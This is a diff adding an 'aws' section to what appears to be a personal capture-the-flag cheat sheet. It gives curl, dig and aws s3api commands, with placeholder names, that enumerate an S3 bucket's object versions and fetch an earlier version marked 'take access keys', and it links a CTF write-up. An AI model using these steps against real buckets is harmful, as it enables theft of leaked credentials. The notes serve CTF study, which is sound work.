@@ -345,4 +345,17 @@ done 2>/dev/null | vim -
 https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
 https://klatz.co/ctf-blog/boilerctf-alien-tech
 
+# aws
 
+```bash
+# take aws domain name
+dig foo
+# take version id header
+curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
+# take version id
+curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
+# take access keys
+curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
+aws s3api get-object --bucket foo --key bar bar
+```
+    - https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
